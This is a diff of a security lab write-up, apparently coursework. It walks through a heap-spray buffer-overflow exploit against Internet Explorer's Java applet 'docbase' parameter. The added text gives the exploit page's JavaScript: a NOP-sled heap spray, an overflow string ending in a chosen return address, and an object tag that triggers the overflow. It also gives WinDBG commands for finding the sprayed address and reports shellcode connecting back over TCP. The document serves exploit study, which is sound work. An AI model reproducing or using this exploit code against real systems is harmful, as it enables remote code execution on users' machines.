@@ -88,7 +88,7 @@ class HandlerClass(SimpleHTTPRequestHandler):
 
 2. To spray the heap with the shellcode, an array **a** is initialized and a function **heap_spray()** is specified to populate **a**
 
-```javascript
+```html
 <script> 
     var a = new Array();
     function heap_spray() {
@@ -115,6 +115,48 @@ class HandlerClass(SimpleHTTPRequestHandler):
 ```
 The 0x90 bytes that conform the NOP sled have to be passed to the function **unescape()** to let javascript know that the string is already represented in hex. 
 
-Without the second line within the for loop, the memory allocator fails to spray the heap and only allocated one block. 
+Without the second line within the for loop, the memory allocator fails to spray the heap and only allocates one block.
 
-3. 
+3. Just below the previous block of code is the following:
+
+```html
+<script>
+    .
+    .
+    .
+function trigger() {
+    var buf = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + "\x95\xff\xda\x09";
+
+    var htmlTags =
+    "<object type='application/x-java-applet'>" +
+    "<param name='launchjnlp' value='1'>" +
+    "<param name='docbase' value='" + buf + "'>" +
+    "</object>";
+
+    document.write(htmlTags);
+    }
+   </script>
+</head>
+<body onload="heap_spray()">
+    <input type="button" value="Click Me" onclick="trigger()">
+</body>
+```
+
+This means that as soon as we click on the page (jnlp1.html), the heap should be sprayed because of `<body onload="heap_spray">`
+
+Loading that page, and attaching the IE tab with WinDBG, we can search for specific bytes that we know are present in the shellcode. Like this `s 0x00000000 L?0x7FFFFFFF 90 90 90 fc e8 82 00`. This would show all of the addresses that store that set of bytes. I chose x09DAFF95 because it does not contain zeroes, and therefore, will not create null bytes in the input.
+
+We have to make sure that our chosen address contains the NOP sled. Run `dc 09daff95`
+
+![alt text](https://github.com/pwilthew/Systems-Security/blob/master/Heap-Spray/Screen%20Shot%202017-10-08%20at%2018.16.32.png)
+
+3. Now that we have the address to jump to, we can append it to the end of the long string of repeated "A". This will be address that will override the value $eip. To execute the buffer overflow, we have to click on "Click Me," as the function trigger() is called immediately after doing so: `<input type="button" value="Click Me" onclick="trigger()">`
+
+Before clicking, we need to wait for incoming TCP connections in the Windows command prompt (as explain in #3 of **Specifics**).
+
+![alt text](https://github.com/pwilthew/Systems-Security/blob/master/Heap-Spray/Screen%20Shot%202017-10-08%20at%2018.21.55.png)
+
+4. That should be it! The program jumped to the address that contained a shellcode and the shellcode effectively established a TCP connection to the chosen IP (127.0.0.1)
+
+![alt text](https://github.com/pwilthew/Systems-Security/blob/master/Heap-Spray/Screen%20Shot%202017-10-08%20at%2018.21.59.png)
+
